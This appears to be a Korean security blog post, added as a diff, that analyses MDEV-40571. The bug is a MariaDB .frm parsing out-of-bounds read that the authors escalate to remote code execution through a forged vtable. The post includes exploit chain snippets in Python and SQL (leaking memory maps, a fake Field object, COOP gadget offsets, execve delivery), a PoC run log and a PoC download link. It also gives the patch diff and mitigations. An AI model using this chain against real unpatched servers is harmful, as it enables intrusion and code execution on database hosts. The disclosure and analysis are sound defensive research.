@@ -1,0 +1,318 @@
+---
+title: "MariaDB .frm 파싱 OOB Read를 통한 vtable Hijacking RCE"
+date: "2026-09-13"
+description: "MariaDB의 .frm 메타데이터 파싱 과정에서 발생하는 배열 범위 초과 읽기(OOB Read)가 조작된 C++ 객체와 vtable 위조로 이어져 mariadbd 프로세스 권한의 임의 코드 실행에 도달하는 과정 분석 (MDEV-40571)"
+tags: ["CVE", "MariaDB", "OOB", "RCE", "vtable", "database", "exploitation"]
+categories: ["Research"]
+authors:
+  - name: "pinebudweiser"
+    link: "https://github.com/pinebudweiser"
+    image: "https://github.com/pinebudweiser.png"
+  - name: "Ph4nt0m"
+    link: "https://github.com/Phantomn"
+    image: "https://github.com/Phantomn.png"
+---
+
+## 개요
+
+이 글은 팀원 **배대식(pinebudweiser)**이 발견하고 HackerOne을 통해 MariaDB에 제보한 취약점을 정리한 것이다. 나는 분석과 재현 과정에서 도움을 줬고, 리포트 크레딧에도 공동으로 이름을 올렸다.
+
+대상은 MariaDB의 `.frm` 파일(테이블 메타데이터) 파서다. `key_part->fieldnr` 값의 상한 검증 누락으로 `share->field[]` 배열을 범위 밖으로 읽게 되고, 이 값이 `Field*` 포인터로 그대로 해석되면서 공격자가 조작한 C++ 객체와 가짜 vtable을 가리키게 만들 수 있다. 이후 발생하는 가상 함수 호출이 공격자가 지정한 주소로 흘러가면서 `mariadbd` 프로세스 권한의 임의 코드 실행으로 이어진다.
+
+- **취약점 ID**: MDEV-40571
+- **보고 경로**: HackerOne [#3897914](https://hackerone.com/reports/3897914)
+- **공개 권고**: [GHSA-c4gx-34mg-95q5](https://github.com/MariaDB/server/security/advisories/GHSA-c4gx-34mg-95q5)
+- **PoC/실험 환경**: [pinebudweiser/mariadb-13.1.0-rce-lab](https://github.com/pinebudweiser/mariadb-13.1.0-rce-lab)
+- **심각도**: High, CVSS 3.1 8.8 (HackerOne 기준) / 8.0 (GHSA 기준)
+- **CVE**: 이 글 작성 시점 기준 미할당 (MariaDB 측이 요청은 넣었으나 발급 대기 중이라고 밝힘)
+
+---
+
+## 취약점 상세
+
+### 근본 원인
+
+#### fieldnr을 검증 없이 인덱스로 쓰는 코드
+
+`.frm` 파일의 키 정의 블록을 파싱하는 코드(10.4.18 기준 `sql/table.cc:823`)는 `fieldnr`을 `.frm` 바이트에서 그대로 읽어 들인다. 부호 없는 16비트 값이라 상한이 없다면 0~65535 전 구간을 공격자가 채울 수 있다.
+
+```c++
+// sql/table.cc:823 (10.4.18) - .frm의 key part 블록에서 fieldnr을 그대로 읽는다
+key_part->fieldnr = (uint16) (uint2korr(strpos) & FIELD_NR_MASK);
+```
+
+이 값은 이후 여러 지점에서 `share->field[]`의 인덱스로 쓰이는데, 그중 패치 대상이 된 지점(10.4.18 `sql/table.cc:2700-2709`)이 실제 exploitation에 사용된 코드다.
+
+```c++
+// sql/table.cc:2700-2709 (10.4.18, 패치 전)
+Field *field;
+if (new_field_pack_flag <= 1)
+  key_part->fieldnr = (uint16) find_field(share->field,
+                                 share->default_values,
+                                 (uint) key_part->offset,
+                                 (uint) key_part->length);
+if (!key_part->fieldnr)          // [!] 0인지만 검사, 상한(share->fields) 검증 없음
+  goto err;
+
+field = key_part->field = share->field[key_part->fieldnr-1];  // OOB read 지점
+key_part->type = field->key_type();  // vtable을 경유하는 가상 함수 호출 - 트리거 지점
+```
+
+검증은 "`fieldnr`이 0이 아닌가"뿐이고, `fieldnr`이 `share->fields`(실제 필드 개수)를 넘는 상한 검증은 어디에도 없다. `share->fields`가 5인 테이블에서도 `fieldnr`을 47, 65535 등으로 조작하면 그대로 통과한다. 동일한 결함(상한 검증 누락)이 `sql/table.cc` 내 `share->field[fieldnr-1]` 형태로 인덱싱하는 4~5개 지점에 반복돼 있었다(뒤의 [패치 diff](#패치-diff-실제-수정-내용) 참고).
+
+#### share->field 배열의 메모리 배치
+
+`share->field`는 `TABLE_SHARE::init_from_binary_frm_image()`가 `multi_alloc_root()`로 다른 여러 버퍼와 함께 한 번에 할당한다(10.4.18 `sql/table.cc:2025-2038`).
+
+```c++
+// sql/table.cc:2025-2038 (10.4.18)
+if (!multi_alloc_root(&share->mem_root,
+                      &share->field, (uint)(share->fields+1)*sizeof(Field*),
+                      &share->intervals, (uint)interval_count*sizeof(TYPELIB),
+                      &share->check_constraints, (uint) share->table_check_constraints * sizeof(Virtual_column_info*),
+                      &interval_array, (uint) (share->fields+interval_parts+ keys+3)*sizeof(char *),
+                      &typelib_value_lengths, total_typelib_value_count * sizeof(uint *),
+                      &names, (uint) (n_length+int_length),
+                      &comment_pos, (uint) com_length,
+                      &vcol_screen_pos, vcol_screen_length,
+                      NullS))
+    goto err;
+```
+
+`multi_alloc_root`는 나열된 버퍼들을 하나의 연속된 청크 안에 순서대로 배치한다. 즉 `share->field[]` 배열 뒤에는 `intervals`, `check_constraints`, `interval_array`, `typelib_value_lengths`, `names`, **`comment_pos`**, `vcol_screen_pos`가 순서대로 이어 붙는다. `comment_pos`는 테이블 컬럼의 `COMMENT '...'` 절 내용을 그대로 담는 버퍼이며, 그 크기(`com_length`)와 내용 모두 공격자가 SQL로 완전히 제어할 수 있다.
+
+`fieldnr`을 정확한 값으로 조작하면 `share->field[fieldnr-1]`이 이 청크 뒤쪽의 `comment_pos` 영역을 가리키게 되고, `comment_pos`에 담긴 임의 바이트 8개가 그대로 `Field*` 포인터 값으로 취급된다. PoC 저장소(`pinebudweiser/mariadb-13.1.0-rce-lab`)가 실측한 오프셋은 다음과 같다(`share->field + 0x171`, 10.4.18 기준).
+
+```text
+&share->mem_root  (TABLE_ALLOC_BLOCK_SIZE = 4096 byte)
++---------------------------------------------------------------+
+| USED_MEM header                                                |
++---------------------------------------------------------------+
+| [key allocs: KEY, KEY_PART_INFO, rec_per_key ...]              |
++---------------------------------------------- ^ bump pointer   |
+| default_values  (32B)                        | alloc_root()    |  <- ldf.field_length 확대로
++---------------------------------------------- |                |     이 뒤 comment.str까지 OOB read
+| [multi_alloc_root 청크]                       |                |
+|  +- share->field[]     <- Field* 배열         |                |
+|  +- share->intervals                          |                |
+|  +- interval_array                            |                |
+|  +- typelib_value_lengths                     |                |
+|  +- names                                     |                |
+|  +- comment_pos  <- 페이로드 object가 여기 위치 |                |  <- [MDEV-40571] fieldnr 조작 시
+|  +- vcol_screen_pos                           |                |     share->field[fieldnr-1]가 여기를 가리킴
++---------------------------------------------- |                |
+| Field_long object [id]                        | alloc_root()   |  i=0
++---------------------------------------------- |                |
+| Field_long object [AAAAAAAA]                  | alloc_root()   |  i=1 (default_values+0x171)
+|  vtable | ptr | null_ptr | table | comment.str|                |  <- leak 대상: comment.str = comment_pos
++---------------------------------------------- |                |
+| Field_string object [ldf]                     | alloc_root()   |  i=2
++---------------------------------------------- |                |
+| Field_enum object [e]  / Field_long object [v]|                |  i=3, i=4
++---------------------------------------------- v                |
++---------------------------------------------------------------+
+```
+
+#### vtable 경유 가상 함수 호출이 실행 흐름을 뒤집는 지점
+
+`field->key_type()` 호출부의 실제 디스어셈블리(x86-64, 10.4.18)는 이 인덱싱이 어떻게 제어권 탈취로 이어지는지 보여준다.
+
+```x86asm
+72440A:  mov    0x188(%r14),%rdx       ; rdx = share->field   (r14 = share, +0x188)
+724411:  mov    -0x8(%rdx,%rax,8),%r12 ; r12 = share->field[fieldnr-1] = *(field_base + fieldnr*8 - 8)
+724416:  mov    %r12,0x0(%r13)         ; key_part->field = field
+72441A:  mov    (%r12),%rax            ; rax = *(field) = vtable  <- comment_pos에 심은 값이 "vtable 포인터"가 됨
+72441E:  mov    %r12,%rdi              ; rdi = field (this)
+724421:  call   *0x168(%rax)           ; field->key_type() 호출 (vtable+0x168) <- 제어된 주소로 분기
+```
+
+`share->field[fieldnr-1]`이 `comment_pos`를 가리키면 `*(field)`, 즉 "vtable"도 `comment_pos` 버퍼 안의 값이 된다. 공격자가 `comment_pos`에 자기 자신을 가리키는 self-referential 구조(`vtable = comment_pos` 자신)를 심고 `vtable+0x168`(13.1.0에서는 슬롯이 `+0x380`으로 다르다) 위치에 원하는 함수 포인터를 채워 넣으면, `field->key_type()` 호출이 그 함수로 그대로 분기한다.
+
+결과적으로 공격자는:
+
+1. `.frm`의 `key_part->fieldnr` 값을 조작해 `share->field[]`에서 범위 밖 읽기를 유도하고
+2. 그 읽기 대상이 자신이 `COMMENT` 절로 채워 넣은 `comment_pos` 버퍼를 가리키게 만들어 가짜 `Field*` 객체(및 자기 참조 가짜 vtable)로 치환한 뒤
+3. `field->key_type()` 등 이 객체를 향한 C++ 가상 함수 호출을 발생시켜
+4. 호출 대상을 임의 주소(COOP 가젯 체인)로 제어한다.
+
+### exploitation 체인: leak - calibration - arm - trigger
+
+메모리에 심은 값이 곧바로 함수 포인터가 되려면 그 전에 두 가지가 필요하다: (1) `comment_pos`가 힙의 어느 주소에 있는지 알아야 하고(ASLR), (2) `mariadbd`/`libc`가 로드된 베이스 주소를 알아야 COOP 가젯 주소를 계산할 수 있다. PoC(`exploit/13.1.0/lab_exploit.py`)는 이를 SQL 질의만으로 4단계에 걸쳐 수행한다.
+
+**1) 베이스 주소 leak** - `LOAD DATA INFILE '/proc/self/maps'`로 `mariadbd`/`libc.so.6`의 매핑을 테이블에 적재한 뒤 `r-xp` 세그먼트 라인을 조회해 ELF 로드 베이스(`시작 주소 - 파일 오프셋`)를 계산한다.
+
+```python
+def _loadbase(line):
+    p = line.split(); start = int(p[0].split("-")[0], 16); off = int(p[2], 16)
+    return start - off
+```
+
+**2) comment_pos 주소 leak** - `ldf` 컬럼의 `field_length`를 `.frm` 안에서 512~1024바이트로 확대한 뒤 `information_schema.COLUMNS`의 `COLUMN_DEFAULT`를 조회하면, `default_values` 버퍼를 그 확장된 길이만큼 읽어 응답에 실어 보낸다. 이 OOB 범위 안에 이웃 `Field` 객체의 `comment.str` 멤버(=`comment_pos` 주소)가 포함돼 그대로 leak된다.
+
+```python
+def comment_str(conn):
+    h = conn.scalar("SELECT HEX(CONVERT(COLUMN_DEFAULT USING latin1)) FROM information_schema.COLUMNS "
+                  "WHERE TABLE_SCHEMA='p3' AND TABLE_NAME='t16' AND COLUMN_NAME='ldf'")
+    buf = unescape(bytes.fromhex(h)) if h else b""
+    C = struct.unpack_from("<Q", buf, CMTSTR_RECOFF)[0]   # comment_pos 주소를 그대로 읽어냄
+    return (C if 0x700000000000 <= C <= 0x7fffffffffff else None), buf
+```
+
+**3) 캘리브레이션(안정화)** - `comment_pos`는 mem_root 아레나 안 위치라 다른 커넥션의 할당/해제로 흔들릴 수 있다. PoC는 leak을 두 번 연속 수행해 같은 주소가 나오는지 비교하고, 값이 다르면(`stable=False`) 그대로 중단한다. 추가로 16개 커넥션을 미리 열어 두어(`8코어 x 2 = 16` 아레나 슬롯) 스레드별 아레나 할당을 고정시켜 안정성을 높인다.
+
+```python
+C, buf = leak_C(conn, base)
+C2, _ = leak_C(conn, base)
+if C2 != C:
+    print("[!] chunk NOT stable across deliver (C moved) -> ABORT before firing"); return
+```
+
+**4) arm 및 trigger** - 안정성이 확인되면 `comment_pos` 위치에 자기 참조형 가짜 `Field` 객체와 COOP 가젯 체인(`G0 -> GENTRY -> G2 -> execve`)을 채워 넣고, `.frm`의 `fieldnr` 바이트를 실제 공격 값(13.1.0 기준 47)으로 덮어써 `DUMPFILE`/`FLUSH TABLES`/`SHOW CREATE TABLE`로 전달한다. `SHOW CREATE TABLE`이 `.frm`을 다시 파싱하는 순간 `field->key_type()` 호출이 가젯 체인 첫 단계로 분기하며 최종적으로 `execve(cmd)`가 실행된다.
+
+```python
+put(0x000, C)             # self-ref: field=C, vtable=C
+put(0x380, MB+G0_OFF)     # key_type() vtable 슬롯 -> G0
+put(0x0c8, MB+GENTRY_OFF) # G0 -> GENTRY
+put(0x280, MB+G2_OFF)     # GENTRY -> G2
+put(0x160, LB+EXECVE_OFF) # G2 -> execve(path, argv, envp=NULL)
+```
+
+이 네 단계는 전부 인증된 SQL 세션(`SELECT`, `LOAD DATA INFILE`, `DUMPFILE`, `FLUSH TABLES`, `SHOW CREATE TABLE`)만으로 완결되며, OS 셸이나 디버거 접근을 전혀 요구하지 않는다.
+
+### 공격 전제조건
+
+HackerOne 리포트가 명시한 PoC 조건은 다음과 같다.
+
+- 공격자는 인증된 SQL 세션을 보유
+- 해당 SQL 계정이 전역 `FILE` 권한을 가짐
+- `secure_file_priv`가 비어있거나(파일 조작 허용) 미설정
+- MariaDB OS 계정이 데이터 디렉토리 내 파일 생성 가능
+- 공격자가 MariaDB로 하여금 조작된 `.frm`을 로드하게 만들 수 있음
+
+중요한 점은 **OS 셸이나 직접적인 파일시스템 접근이 필요 없다**는 것이다. 실제 원격 공격 체인은 SQL 인터페이스만으로 완결된다.
+
+```sql
+DROP TABLE ...;                          -- 기존 테이블/.frm 제거
+SELECT UNHEX('...') INTO DUMPFILE '...'; -- 조작된 .frm 파일 기록
+FLUSH TABLES;                            -- 테이블 캐시 무효화
+SHOW CREATE TABLE ...;                   -- MariaDB가 조작된 .frm을 로드/파싱
+```
+
+즉 필요한 권한은 `FILE`, `RELOAD`, `CREATE`, `DROP`, `SELECT`, `INSERT` 조합이며 `SUPER` 권한조차 필요 없다. `FILE` 권한의 의도는 "SQL로 파일을 읽고 쓰는 것"까지이지, "서버 프로세스 권한으로 임의 코드 실행"은 아니라는 점에서 이 취약점은 권한 경계를 명확히 넘어선다.
+
+### 검증된 영향 범위
+
+PoC로 RCE까지 재현된 버전:
+
+- MariaDB 10.4.18 (원격 체인)
+- MariaDB 11.8.8
+- MariaDB 12.3.2
+- MariaDB 13.1.0 Preview (로컬 체인)
+
+메모리 할당 구조상 다른 라인(10.6.x, 11.4.x, 12.3.x 등)도 동일한 결함을 공유할 가능성이 높다고 보고서는 밝히고 있으며, 실제로 공개된 GHSA 권고는 10.6.1-27, 10.11.1-18, 11.4.1-12, 11.8.1-8, 12.3.1-2, 13.0.1까지를 영향 범위로 확정했다.
+
+---
+
+## 결과
+
+성공적인 익스플로잇은 `mariadbd` 프로세스의 OS 권한으로 임의 코드 실행을 제공한다. 리포트에 첨부된 PoC 실행 로그 일부:
+
+```
+$ python3 t16_e2e.py --fire
+connected. server ver: 13.1.0-MariaDB
+leaked C comment_pos: 0x77f3a4032f90
+CALIB: re-leaked 0x77f3a4032f90 stable True
+arming fieldnr, delivering weapon, triggering R5
+execve cmd 'id > /tmp/frm_pwned_t16 2>&1; echo PWNED_$(id -u) >> /tmp/frm_pwned_t16'
+trigger raised (expected on execve): OperationalError 2013 'Lost connection to MySQL server during query'
+fired. check /tmp/frm_pwned_t16 for proof.
+
+$ cat /tmp/frm_pwned_t16
+uid=1000(pinebudweiser) gid=1000(pinebudweiser) groups=1000(pinebudweiser),...,110(docker)
+PWNED_1000
+```
+
+`FILE` 권한만으로 시작해 서버 프로세스 계정 전체 권한(자격증명, 설정, 프로세스 메모리 접근, 아웃바운드 네트워크 연결 등)까지 확장 가능하다는 것이 이 취약점의 실질적 파급력이다. 다만 이것이 root 권한을 자동으로 보장하지는 않으며, 최종 영향은 `mariadbd`를 어떤 OS 계정으로 구동했는지에 달려있다.
+
+### PoC 영상
+
+**원격 체인 (MariaDB 10.4.18, SQL 인터페이스만으로 완결)**
+
+<video controls preload="metadata" width="100%" style={{borderRadius: "8px"}}>
+  <source src="/videos/blog/mariadb-frm-oob-rce/remote-10.4.18-poc.mp4" type="video/mp4" />
+</video>
+
+**로컬 체인 (MariaDB 13.1.0 Preview)**
+
+<video controls preload="metadata" width="100%" style={{borderRadius: "8px"}}>
+  <source src="/videos/blog/mariadb-frm-oob-rce/local-13.1.0-poc.mp4" type="video/mp4" />
+</video>
+
+### PoC 코드
+
+13.1.0 로컬 체인에 사용된 파이썬 익스플로잇 스크립트 3종(`t16_e2e.py`, `na_frm_rce2_exploit.py`, `target_reliable.py`)을 HackerOne 리포트 원본 첨부 그대로 내려받을 수 있다.
+
+[13.1.0_poc.7z 다운로드](/files/blog/mariadb-frm-oob-rce/13.1.0_poc.7z)
+
+전체 실험 환경(빌드 스크립트 포함)은 배대식(pinebudweiser)의 저장소를 참고한다.
+
+- [pinebudweiser/mariadb-13.1.0-rce-lab](https://github.com/pinebudweiser/mariadb-13.1.0-rce-lab)
+
+> 이미 벤더 패치가 나온 뒤 책임 있는 공개 절차(HackerOne 공개 동의, GHSA 발행)를 거쳐 공유하는 것이다. 패치 전 버전을 운영 중이라면 아래 [패치 상태](#패치-상태) 섹션을 먼저 확인해 업그레이드부터 진행할 것.
+
+---
+
+## 타임라인
+
+| 날짜 (UTC) | 내용 |
+|---|---|
+| 2026-07-29 | HackerOne에 최초 제보 |
+| 2026-07-30 | MariaDB 측 Triaged 확인 |
+| 2026-07-31 | 원격 공격 체인(SQL 인터페이스만으로 충분함) 보강 설명, 크레딧 협의 |
+| 2026-08-14 | 10.6.28 릴리스 노트에 MDEV-40571이 공개 참조됨. CVE 발급 여부 문의 |
+| 2026-09-07 | Resolved 처리 |
+| 2026-09-08 | 리포트 공개(Disclosed) |
+
+---
+
+## 패치 diff (실제 수정 내용)
+
+MariaDB 저장소 커밋 [`3b1c2e58a`](https://github.com/MariaDB/server/commit/3b1c2e58abab5571bec4ff52773ddc75b1738da9)("MDEV-40571 insufficient validation of frm data when opening a table")가 실제 수정 커밋이다. 커밋 메시지는 "numerous checks that the frm is valid, no OOB reads... most asserts were changed to if()'s"라고 밝히고 있다 - 즉 상당수 검증이 원래 `DBUG_ASSERT`(릴리스 빌드에서는 사라지는 디버그 전용 검증)로만 존재했고, 이를 항상 동작하는 `if()` 런타임 체크로 바꾼 것이 패치의 핵심이다. `share->field[fieldnr-1]` 형태로 인덱싱하는 지점마다 상한 검증이 추가됐다.
+
+```diff
+-        DBUG_ASSERT(key_part[i].fieldnr > 0);
++        if (key_part[i].fieldnr <= 0 || key_part[i].fieldnr > share->fields)
++          goto err;
+         Field *table_field= share->field[key_part[i].fieldnr - 1];
+
+           uint fieldnr= keyinfo[0].key_part[i].fieldnr;
++          if (fieldnr <= 0 || fieldnr > share->fields)
++            goto err;
+           if (share->field[fieldnr-1]->key_length() != ...
+
+           uint fieldnr= keyinfo->key_part[i].fieldnr;
++          if (fieldnr <= 0 || fieldnr > share->fields)
++            goto err;
+           field= share->field[fieldnr-1];
+
+-	if (!key_part->fieldnr)
++	if (key_part->fieldnr <= 0 || key_part->fieldnr > share->fields)
+           goto err;
+         field= key_part->field= share->field[key_part->fieldnr-1];
+```
+
+마지막 hunk가 이 글에서 다룬 exploitation 경로(`sql/table.cc:2705` 상당)를 직접 수정한 부분이다. `!key_part->fieldnr`(0인지만 확인)이 `key_part->fieldnr <= 0 || key_part->fieldnr > share->fields`(0 이하이거나 실제 필드 개수를 초과하는지 확인)로 바뀌면서 OOB read 경로가 원천 차단됐다.
+
+## 패치 상태
+
+다음 버전에서 수정됨(상한 검증 추가):
+
+- 10.6.28, 10.11.19, 11.4.13, 11.8.9, 12.3.3, 13.0.2
+
+해당 버전 미만을 사용 중이라면 업그레이드가 최우선이며, 업그레이드가 즉시 불가능한 환경에서는 `FILE` 권한을 신뢰할 수 있는 계정에만 부여하고 `secure_file_priv`를 데이터 디렉토리 밖으로 제한하는 것이 임시 완화책이 된다.
+
+## 참고 링크
+
+- [HackerOne #3897914](https://hackerone.com/reports/3897914)
+- [GHSA-c4gx-34mg-95q5](https://github.com/MariaDB/server/security/advisories/GHSA-c4gx-34mg-95q5)
+- [PoC/실험 환경: mariadb-13.1.0-rce-lab](https://github.com/pinebudweiser/mariadb-13.1.0-rce-lab)
